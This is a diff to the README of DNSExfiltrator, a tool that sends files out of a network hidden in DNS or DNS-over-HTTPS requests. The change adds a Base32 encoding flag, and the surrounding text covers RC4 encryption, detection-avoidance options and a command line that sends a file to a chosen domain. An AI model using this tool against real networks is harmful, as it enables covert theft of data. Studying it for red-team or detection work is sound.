@@ -21,6 +21,8 @@ By default, DNSExfiltrator uses the system's  defined DNS server, but you can al
 
 Alternatively, using the `h` parameter, DNSExfiltrator can perform DoH (*DNS over HTTP*) using the Google or CloudFlare DoH servers.
 
+By default, the data to be exfiltrated is base64URL encoded in order to fit into DNS requests. However some DNS resolvers might break this encoding (*fair enough since FQDN are not supposed to case sensitve anyway*) by messing up with the sensitivity of the case (*upper or lower case*) which is obviously important for the encoding/decoding process. To circumvent this problem you can use the `-b32` flag in order to force Base32 encoding of the data, which comes with a little size overhead. If you're using CloudFlare DoH, base32 encoding is automatically applied.
+
 DNSExfiltrator supports **basic RC4 encryption** of the exfiltrated data, using the provided password to encrypt/decrypt the data.
 
 DNSExfiltrator also provides some optional features to avoid detection:
@@ -54,10 +56,11 @@ You can **either** use the compiled version, **or** the PowerShell wrapper (*whi
 
 1/ Using the C# compiled Windows executable (*which you can find in the `release` directory*):
 ```
-dnsExfiltrator.exe <file> <domainName> <password> [h=google|cloudflare] [s=<DNS_server>] [t=<throttleTime>] [r=<requestMaxSize>] [l=<labelMaxSize>]
+dnsExfiltrator.exe <file> <domainName> <password> [-b32] [h=google|cloudflare] [s=<DNS_server>] [t=<throttleTime>] [r=<requestMaxSize>] [l=<labelMaxSize>]
       file:           [MANDATORY] The file name to the file to be exfiltrated.
       domainName:     [MANDATORY] The domain name to use for DNS requests.
       password:       [MANDATORY] Password used to encrypt the data to be exfiltrated.
+      -b32:           [OPTIONNAL] Use base32 encoding of data. Might be required by some DNS resolver break case.
       h:              [OPTIONNAL] Use Google or CloudFlare DoH (DNS over HTTP) servers.
       DNS_Server:     [OPTIONNAL] The DNS server name or IP to use for DNS requests. Defaults to the system one.
       throttleTime:   [OPTIONNAL] The time in milliseconds to wait between each DNS request.
